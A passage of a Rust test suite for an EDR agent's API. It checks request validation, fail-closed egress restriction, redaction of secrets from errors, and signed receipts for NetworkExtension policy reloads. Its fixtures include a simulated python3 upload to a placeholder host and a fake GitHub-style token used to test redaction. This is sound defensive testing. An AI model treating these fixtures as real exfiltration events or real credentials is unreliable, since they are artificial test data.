                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| panic!("failed to build ttl validation request: {e}"));
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("ttl validation request failed: {e}"));
            assert_eq!(response.status(), StatusCode::BAD_REQUEST);
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read ttl validation error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("ttl validation error is not utf8: {e}"));
            assert!(error.contains("ttlSeconds must be between 1 and 3600 seconds"));
        }
    }

    #[tokio::test]
    async fn agent_edr_response_action_rejects_oversized_reason() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .with_state(Arc::new(test_state()));
        let oversized_reason = "x".repeat(EDR_MAX_RESPONSE_REASON_BYTES + 1);
        let body = serde_json::json!({
            "action": "collect_evidence",
            "rootNodeId": "process:reason-validation",
            "reason": oversized_reason
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build oversized reason request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("oversized reason request failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read oversized reason error: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("oversized reason error is not utf8: {e}"));
        assert!(error.contains("response action reason must be at most 1024 bytes"));
    }

    #[tokio::test]
    async fn agent_edr_response_action_rejects_oversized_actor_identity() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .with_state(Arc::new(test_state()));
        let body = serde_json::json!({
            "action": "collect_evidence",
            "rootNodeId": "process:actor-validation",
            "actor": {
                "userId": "x".repeat(EDR_MAX_RESPONSE_ACTOR_FIELD_BYTES + 1)
            }
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build oversized actor request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("oversized actor request failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read oversized actor error: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("oversized actor error is not utf8: {e}"));
        assert!(error.contains("actor.userId must be at most 256 bytes"));
    }

    #[tokio::test]
    async fn agent_edr_response_control_requests_reject_unknown_fields() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/cancel",
                post(agent_edr_response_execution_cancel),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge",
                post(agent_edr_response_execution_acknowledge),
            )
            .with_state(Arc::new(test_state()));

        for (uri, body, field) in [
            (
                "/api/v1/agent/edr/response-action",
                serde_json::json!({
                    "action": "collect_evidence",
                    "rootNodeId": "process:missing",
                    "unexpectedField": true
                }),
                "unexpectedField",
            ),
            (
                "/api/v1/agent/edr/response-action",
                serde_json::json!({
                    "action": "collect_evidence",
                    "rootNodeId": "process:missing",
                    "actor": {
                        "unexpectedActorField": true
                    }
                }),
                "unexpectedActorField",
            ),
            (
                "/api/v1/agent/edr/response-action",
                serde_json::json!({
                    "action": "collect_evidence",
                    "process": {
                        "processGUID": "proc-misspelled-selector"
                    }
                }),
                "processGUID",
            ),
            (
                "/api/v1/agent/edr/response-executions/missing/cancel",
                serde_json::json!({
                    "reason": "cancel stale execution",
                    "unexpectedField": true
                }),
                "unexpectedField",
            ),
            (
                "/api/v1/agent/edr/response-executions/missing/rollback",
                serde_json::json!({
                    "reason": "rollback stale execution",
                    "unexpectedField": true
                }),
                "unexpectedField",
            ),
            (
                "/api/v1/agent/edr/response-executions/missing/acknowledge",
                serde_json::json!({
                    "acknowledgedBy": "operator:test",
                    "unexpectedField": true
                }),
                "unexpectedField",
            ),
            (
                "/api/v1/agent/edr/response-executions/missing/acknowledge",
                serde_json::json!({
                    "acknowledgedBy": "operator:test",
                    "controlApi": {
                        "unexpectedNestedField": true
                    }
                }),
                "unexpectedNestedField",
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("POST")
                .uri(uri)
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| {
                    panic!("failed to build unknown-field response control request: {e}")
                });
            let response =
                app.clone().oneshot(req).await.unwrap_or_else(|e| {
                    panic!("unknown-field response control request failed: {e}")
                });
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| {
                    panic!("failed to read unknown-field response control error: {e}")
                });
            let error = String::from_utf8(bytes.to_vec()).unwrap_or_else(|e| {
                panic!("unknown-field response control error is not utf8: {e}")
            });
            assert_eq!(
                status,
                StatusCode::UNPROCESSABLE_ENTITY,
                "unexpected status for {uri}: {error}"
            );
            assert!(
                error.contains("unknown field") && error.contains(field),
                "unexpected unknown-field error for {uri}: {error}"
            );
        }
    }

    #[tokio::test]
    async fn agent_edr_response_action_restrict_egress_fails_closed_when_provider_unready() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[62u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state);
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                network_extension: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    policy_synced: Some(false),
                    enforcement_ready: Some(false),
                    last_error: Some(
                        "provider policy update pending: ghs_1234567890abcdef1234".to_string(),
                    ),
                    ..ProviderStatus::unknown()
                },
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route("/api/v1/agent/edr/receipts", get(agent_edr_receipts))
            .route(
                "/api/v1/agent/edr/response-executions",
                get(agent_edr_response_executions),
            )
            .with_state(state.clone());

        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-restrict-egress-unready-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "unready-egress.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://unready-egress.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build unready findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("unready findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "restrict_egress",
            "process": {
                "processGuid": "proc-restrict-egress-unready-1"
            },
            "ttlSeconds": 600,
            "reason": "contain observed egress while provider is unready",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build unready response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("unready response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::CONFLICT);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read unready response error: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("unready response error is not utf8: {e}"));
        assert!(error.contains("network extension provider is not ready for restrict_egress"));
        assert!(error.contains("policy_not_synced"));
        assert!(error.contains("enforcement_not_ready"));
        assert!(error.contains("provider_last_error:provider policy update pending"));
        assert!(error.contains("[REDACTED]"));
        assert!(!error.contains("ghs_1234567890abcdef1234"));
        assert!(error.contains("failed response execution recorded as"));
        assert!(!state.edr_network_extension_egress_policy_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/response-executions?limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build unready execution list request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("unready execution list request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read unready execution list: {e}"));
        let executions_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode unready execution list: {e}"));
        assert_eq!(executions_payload["execution_count"], 1);
        let execution = &executions_payload["executions"][0]["execution"];
        assert_eq!(execution["action"], "restrict_egress");
        assert_eq!(execution["status"], "failed");
        assert_eq!(execution["actor"]["userId"], "operator:test");
        assert!(execution["reason"]
            .as_str()
            .unwrap_or_else(|| panic!("missing unready execution reason"))
            .contains("policy_not_synced"));
        assert!(execution["reason"]
            .as_str()
            .unwrap_or_else(|| panic!("missing unready execution reason"))
            .contains("[REDACTED]"));
        assert!(!execution["reason"]
            .as_str()
            .unwrap_or_else(|| panic!("missing unready execution reason"))
            .contains("ghs_1234567890abcdef1234"));
        assert!(execution["summary"]
            .as_str()
            .unwrap_or_else(|| panic!("missing unready execution summary"))
            .contains("network extension provider is not ready for restrict_egress"));
        assert!(execution["summary"]
            .as_str()
            .unwrap_or_else(|| panic!("missing unready execution summary"))
            .contains("[REDACTED]"));
        assert!(!execution["summary"]
            .as_str()
            .unwrap_or_else(|| panic!("missing unready execution summary"))
            .contains("ghs_1234567890abcdef1234"));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/receipts?family=response_execution&limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build unready receipt list request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("unready receipt list request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read unready receipt list: {e}"));
        let receipts_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode unready receipt list: {e}"));
        assert_eq!(receipts_payload["receipt_count"], 1);
        let failed_decision =
            &receipts_payload["receipts"][0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(failed_decision["receiptFamily"], "response_execution");
        assert_eq!(failed_decision["decision"]["action"], "restrict_egress");
        assert_eq!(failed_decision["decision"]["passed"], false);
        let failed_hash = sha256(b"failed").to_hex_prefixed();
        assert!(failed_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing unready failed receipt evidence"))
            .iter()
            .any(|item| item["key"] == "executionStatus"
                && item["valueHash"].as_str() == Some(failed_hash.as_str())));

        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn network_extension_egress_policy_proof_does_not_claim_enforcement_when_provider_unready(
    ) {
        let state = Arc::new(test_state());
        let now = chrono::Utc::now();
        write_network_extension_egress_policy_snapshot(
            state.edr_network_extension_egress_policy_path.as_ref(),
            &[EndpointEgressRestriction {
                restriction_id: "restriction-proof-unready".to_string(),
                execution_id: "execution-proof-unready".to_string(),
                action_id: "action-proof-unready".to_string(),
                graph_slice_id: "graph-proof-unready".to_string(),
                rollback_ref: "rollback-proof-unready".to_string(),
                target: "proof-unready.example.invalid:443".to_string(),
                target_hash: sha256(b"proof-unready.example.invalid:443").to_hex_prefixed(),
                active: true,
                created_at: now,
                expires_at: now + chrono::Duration::minutes(10),
                updated_at: now,
            }],
            now,
        )
        .unwrap_or_else(|err| panic!("failed to write NetworkExtension proof snapshot: {err}"));
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                network_extension: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    policy_synced: Some(false),
                    enforcement_ready: Some(false),
                    last_error: Some("policy reload pending".to_string()),
                    ..ProviderStatus::unknown()
                },
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/network-extension/egress-policy/proof",
                post(agent_edr_network_extension_egress_policy_proof),
            )
            .with_state(state.clone());
        let body = serde_json::json!({
            "refreshProviders": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/network-extension/egress-policy/proof")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build unready proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("unready proof request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read unready proof response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode unready proof response: {e}"));
        assert_eq!(payload["snapshotPresent"], true);
        assert_eq!(payload["snapshotDecodable"], true);
        assert_eq!(payload["enforcementReady"], false);
        assert_eq!(payload["liveEnforcementProven"], false);
        assert!(payload["liveEnforcementProofReasons"]
            .as_array()
            .unwrap_or_else(|| panic!("missing unready live-enforcement proof reasons"))
            .iter()
            .any(|reason| reason == "provider_not_enforcement_ready"));
        assert_eq!(payload["networkExtensionProvider"]["policy_synced"], false);
        assert_eq!(
            payload["networkExtensionProvider"]["enforcement_ready"],
            false
        );

        let false_hash = sha256(b"false").to_hex_prefixed();
        let evidence = payload["receipt"]["receipt"]["metadata"]["endpointDecision"]["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing unready proof receipt evidence"));
        assert!(evidence.iter().any(|item| {
            item["key"] == "networkExtensionEgressPolicyEnforcementReady"
                && item["valueHash"].as_str() == Some(false_hash.as_str())
        }));
        assert!(evidence.iter().any(|item| {
            item["key"] == "networkExtensionLiveEnforcementProven"
                && item["valueHash"].as_str() == Some(false_hash.as_str())
        }));
        assert!(evidence.iter().any(|item| {
            item["key"] == "networkExtensionPolicySynced"
                && item["valueHash"].as_str() == Some(false_hash.as_str())
        }));
    }

    #[tokio::test]
    async fn network_extension_egress_policy_proof_binds_observed_provider_reload() {
        let state = Arc::new(test_state());
        let now = chrono::Utc::now();
        write_network_extension_egress_policy_snapshot(
            state.edr_network_extension_egress_policy_path.as_ref(),
            &[EndpointEgressRestriction {
                restriction_id: "restriction-proof-reload".to_string(),
                execution_id: "execution-proof-reload".to_string(),
                action_id: "action-proof-reload".to_string(),
                graph_slice_id: "graph-proof-reload".to_string(),
                rollback_ref: "rollback-proof-reload".to_string(),
                target: "proof-reload.example.invalid:443".to_string(),
                target_hash: sha256(b"proof-reload.example.invalid:443").to_hex_prefixed(),
                active: true,
                created_at: now,
                expires_at: now + chrono::Duration::minutes(10),
                updated_at: now,
            }],
            now,
        )
        .unwrap_or_else(|err| panic!("failed to write NetworkExtension proof snapshot: {err}"));
        let policy_snapshot_path = state
            .edr_network_extension_egress_policy_path
            .display()
            .to_string();
        let network_extension_provider: ProviderStatus =
            serde_json::from_value(serde_json::json!({
                "runtime": { "state": "active" },
                "policy_synced": true,
                "enforcement_ready": true,
                "counters": {
                    "flows_observed": 14,
                    "flows_blocked": 4,
                    "remediation_requests": 2,
                    "dropped_verdicts": 0
                },
                "last_reload_observation": {
                    "request_id": "provider-reload-observed-1",
                    "command": "reload_policy",
                    "policy_snapshot_path": policy_snapshot_path,
                    "generation": 12345,
                    "accepted": true,
                    "reloaded": true
                }
            }))
            .unwrap_or_else(|err| {
                panic!("failed to decode provider status with reload observation: {err}")
            });
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                network_extension: network_extension_provider,
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/network-extension/egress-policy/proof",
                post(agent_edr_network_extension_egress_policy_proof),
            )
            .with_state(state.clone());
        let body = serde_json::json!({
            "refreshProviders": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/network-extension/egress-policy/proof")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build observed reload proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("observed reload proof request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read observed reload proof response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode observed reload proof response: {e}"));

        assert_eq!(payload["providerReloadObserved"], true);
        assert_eq!(
            payload["providerReloadRequestId"],
            "provider-reload-observed-1"
        );
        assert_eq!(payload["providerReloadGeneration"], 12345);
        assert_eq!(payload["providerReloadReloaded"], true);
        assert_eq!(
            payload["providerReloadPolicySnapshotPath"],
            policy_snapshot_path
        );
        assert_eq!(
            payload["networkExtensionProvider"]["last_reload_observation"]["request_id"],
            "provider-reload-observed-1"
        );

        let true_hash = sha256(b"true").to_hex_prefixed();
        let request_id_hash = sha256(b"provider-reload-observed-1").to_hex_prefixed();
        let generation_hash = sha256(b"12345").to_hex_prefixed();
        let proof_receipt_evidence = payload["receipt"]["receipt"]["metadata"]["endpointDecision"]
            ["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing observed reload proof receipt evidence"));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadObserved"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadObservedRequestId"
                && item["valueHash"].as_str() == Some(request_id_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadObservedGeneration"
                && item["valueHash"].as_str() == Some(generation_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadObservedReloaded"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
    }

    #[tokio::test]
    async fn agent_edr_response_action_restricts_egress_policy_check_until_rollback() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[58u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-restrict-egress-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        {
            let mut settings = state.settings.write().await;
            settings.enabled = false;
        }
        let mut network_counters = BTreeMap::new();
        network_counters.insert("flows_observed".to_string(), 11);
        network_counters.insert("flows_blocked".to_string(), 3);
        network_counters.insert("remediation_requests".to_string(), 1);
        network_counters.insert("dropped_verdicts".to_string(), 0);
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                network_extension: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    counters: network_counters,
                    policy_epoch: Some(99),
                    policy_synced: Some(true),
                    enforcement_ready: Some(true),
                    ..ProviderStatus::unknown()
                },
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        let (reload_tx, mut reload_rx) =
            tokio::sync::mpsc::channel::<crate::macos::host::MacosNetworkExtensionReloadRequest>(4);
        state
            .macos_host
            .install_network_extension_reload_channel(reload_tx)
            .await;
        let reload_generation_probe = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0));
        let reload_count = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0));
        let reload_policy_path = state
            .edr_network_extension_egress_policy_path
            .display()
            .to_string();
        {
            let reload_generation_probe = reload_generation_probe.clone();
            let reload_count = reload_count.clone();
            let reload_policy_path = reload_policy_path.clone();
            let macos_host = state.macos_host.clone();
            tokio::spawn(async move {
                while let Some(request) = reload_rx.recv().await {
                    let count = reload_count.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;
                    if count == 1 {
                        reload_generation_probe
                            .store(request.generation, std::sync::atomic::Ordering::SeqCst);
                    }
                    macos_host
                        .replace_status(CombinedSystemExtensionStatus {
                            install_state: SystemExtensionInstallState::Installed,
                            approval: SystemExtensionApproval::Approved,
                            endpoint_security: ProviderStatus {
                                runtime: ProviderRuntimeState::Active,
                                ..ProviderStatus::unknown()
                            },
                            network_extension: ProviderStatus {
                                runtime: ProviderRuntimeState::Active,
                                counters: BTreeMap::from([
                                    ("flows_observed".to_string(), 11),
                                    ("flows_blocked".to_string(), 3),
                                    ("remediation_requests".to_string(), 1),
                                    ("dropped_verdicts".to_string(), 0),
                                ]),
                                policy_epoch: Some(99),
                                policy_synced: Some(true),
                                enforcement_ready: Some(true),
                                last_reload_observation: Some(
                                    crate::macos::status::ProviderReloadObservation {
                                        request_id: Some(format!("restrict-egress-reload-{count}")),
                                        command: Some("reload_policy".to_string()),
                                        policy_snapshot_path: Some(reload_policy_path.clone()),
                                        generation: Some(request.generation),
                                        accepted: Some(true),
                                        reloaded: Some(true),
                                        error: None,
                                    },
                                ),
                                ..ProviderStatus::unknown()
                            },
                            ..CombinedSystemExtensionStatus::default()
                        })
                        .await;
                    let _ = request.reply_tx.send(Ok(
                        crate::macos::host::MacosNetworkExtensionReloadResult {
                            requested: true,
                            saved: true,
                            request_id: format!("restrict-egress-reload-{count}"),
                            policy_snapshot_path: reload_policy_path.clone(),
                            generation: request.generation,
                        },
                    ));
                }
            });
        }
        let app = Router::new()
            .route("/api/v1/agent/policy-check", post(agent_policy_check))
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/network-extension/egress-policy/proof",
                post(agent_edr_network_extension_egress_policy_proof),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/expire",
                post(agent_edr_response_execution_expire),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/cancel",
                post(agent_edr_response_execution_cancel),
            )
            .with_state(state.clone());
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-restrict-egress-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "egress.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://egress.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build restrict-egress findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("restrict-egress findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "restrict_egress",
            "process": {
                "processGuid": "proc-restrict-egress-1"
            },
            "ttlSeconds": 600,
            "reason": "restrict observed egress",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build restrict-egress response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("restrict-egress response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read restrict-egress response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode restrict-egress response: {e}"));
        assert_eq!(payload["execution"]["action"], "restrict_egress");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["effectType"],
            "restrict_egress"
        );
        assert_eq!(
            payload["execution"]["effects"][0]["artifact"],
            "egress.example.invalid:443"
        );
        let network_extension_policy =
            read_json_file(state.edr_network_extension_egress_policy_path.as_ref());
        assert_eq!(network_extension_policy["schemaVersion"], 1);
        assert_eq!(
            network_extension_policy["restrictions"][0]["target"],
            "egress.example.invalid:443"
        );
        assert_eq!(
            network_extension_policy["restrictions"][0]["executionId"],
            payload["execution"]["executionId"]
        );
        let execution_receipt: SignedReceipt =
            serde_json::from_value(payload["executionReceipt"].clone()).unwrap_or_else(|e| {
                panic!("failed to decode restrict-egress execution receipt: {e}")
            });
        let endpoint_decision = execution_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing restrict-egress endpointDecision metadata"));
        let true_hash = sha256(b"true").to_hex_prefixed();
        let false_hash = sha256(b"false").to_hex_prefixed();
        let blocked_count_hash = sha256(b"3").to_hex_prefixed();
        let reload_generation = reload_generation_probe.load(std::sync::atomic::Ordering::SeqCst);
        assert!(reload_generation > 0);
        let reload_request_id_hash = sha256(b"restrict-egress-reload-1").to_hex_prefixed();
        let reload_generation_hash =
            sha256(reload_generation.to_string().as_bytes()).to_hex_prefixed();
        let receipt_evidence = endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing restrict-egress receipt evidence"));
        assert!(receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionPolicySynced"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionEnforcementReady"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionFlowsBlocked"
                && item["valueHash"].as_str() == Some(blocked_count_hash.as_str())
        }));
        assert!(receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadRequested"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadSaved"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadRequestId"
                && item["valueHash"].as_str() == Some(reload_request_id_hash.as_str())
        }));
        assert!(receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadGeneration"
                && item["valueHash"].as_str() == Some(reload_generation_hash.as_str())
        }));
        assert!(endpoint_decision["sensorState"]["providers"]
            .as_array()
            .unwrap_or_else(|| panic!("missing receipt sensor providers"))
            .iter()
            .any(
                |provider| provider["providerId"] == "macos.network_extension"
                    && provider["healthy"] == true
            ));
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
